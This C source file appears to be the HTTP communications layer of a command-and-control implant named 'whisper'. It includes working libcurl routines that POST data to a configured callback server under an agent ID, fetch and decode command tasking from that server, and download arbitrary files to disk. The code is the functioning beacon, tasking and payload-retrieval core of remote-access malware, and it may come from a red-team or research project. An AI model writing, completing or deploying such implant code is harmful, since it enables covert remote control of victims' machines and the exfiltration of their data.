#include "whisper_config.h"
#include "whisper_json.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// =======================
// HTTP POST Request using libcurl
// =======================
int post_data(const char *json_data, char *agent_id)
{
    DEBUG_LOG("Posting Data...");
    CURL *curl;
    CURLcode res;
    int ret = 0;

    curl = curl_easy_init();
    if (!curl)
    {
        DEBUG_LOG("curl_easy_init failed\n");
        return 1;
    }

    // Construct URL using your callback macro (only the relative path)
    char url[150];
    //: curl_easy_perform() failed: URL using bad/illegal format or missing URL
    // switched macro to CALLBACK_HTTP_FULL_POST_URL from CALLBACK_HTTP_FORMAT_POST_ENDPOINT
    snprintf(url, sizeof(url), CALLBACK_HTTP_FULL_POST_URL, agent_id);
    DEBUG_LOG("Constructed URL: %s\n", url);

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_data);

    // Set HTTP header: Content-Type: application/json
    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK)
    {
        DEBUG_LOGF(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        ret = 1;
    }
    else
    {
        DEBUG_LOG("POST request sent successfully.\n");
    }

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    return ret;
}

// =======================
// Memory Structure for Response Handling
// =======================
struct Memory
{
    char *response;
    size_t size;
};

// Callback function for writing received data into memory
static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
    size_t realsize = size * nmemb;
    struct Memory *mem = (struct Memory *)userp;

    char *ptr = realloc(mem->response, mem->size + realsize + 1);
    if (!ptr)
    {
        // DEBUG_LOGF(stderr, "Not enough memory (realloc returned NULL)\n");
        return 0;
    }

    mem->response = ptr;
    memcpy(&(mem->response[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->response[mem->size] = '\0';

    return realsize;
}

// =======================
// HTTP GET Request (Equivalent to get_command_data())
// =======================
InboundJsonDataStruct get_command_data(char *agent_id)
{
    InboundJsonDataStruct result = {NULL};
    CURL *curl;
    CURLcode res;
    struct Memory chunk;

    chunk.response = malloc(1); // initial allocation
    chunk.size = 0;

    curl = curl_easy_init();
    if (!curl)
    {
        // DEBUG_LOGF(stderr, "curl_easy_init failed\n");
        free(chunk.response);
        return result;
    }

    // Construct full URL using your callback macro and agent_id
    char url[150];
    snprintf(url, sizeof(url), CALLBACK_HTTP_FULL_GET_URL, agent_id);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK)
    {
        DEBUG_LOGF(stdout, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    }
    else
    {
        DEBUG_LOGF(stdout, "Raw JSON Response: %s\n", chunk.response);
        result = decode_command_json(chunk.response);
    }

    curl_easy_cleanup(curl);
    free(chunk.response);
    return result;
}

// =======================
// HTTP File Download using libcurl
// =======================
int download_file(const char *url, const char *output_path)
{
    CURL *curl;
    CURLcode res;
    FILE *fp = fopen(output_path, "wb");
    if (!fp)
    {
        // DEBUG_LOGF(stderr, "Failed to open file: %s\n", output_path);
        return 1;
    }

    curl = curl_easy_init();
    if (!curl)
    {
        // DEBUG_LOGF(stderr, "curl_easy_init failed\n");
        fclose(fp);
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK)
    {
        // DEBUG_LOGF(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        fclose(fp);
        curl_easy_cleanup(curl);
        return 1;
    }

    // DEBUG_LOG("File downloaded successfully\n");
    fclose(fp);
    curl_easy_cleanup(curl);
    return 0;
}
